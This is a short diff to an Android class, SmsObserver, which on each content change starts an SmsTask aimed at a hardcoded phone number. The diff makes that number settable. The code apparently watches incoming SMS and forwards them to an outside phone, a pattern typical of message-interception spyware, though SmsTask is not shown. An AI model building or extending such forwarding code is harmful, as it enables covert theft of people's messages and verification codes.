@@ -9,12 +9,16 @@ import android.os.Handler;
  */
 public class SmsObserver extends ContentObserver{
     Context context = null;
+    String target_phone = "18807966755";
     public SmsObserver(Handler handler ,Context ctx) {
         super(handler);
         context = ctx;
     }
+    public void setTargetPhone(String phone){
+        target_phone = phone;
+    }
     public void onChange(boolean selfChange){
-        SmsTask smsTask = new SmsTask("18807963708",context);
+        SmsTask smsTask = new SmsTask(target_phone,context);
         smsTask.start();
     }
 }
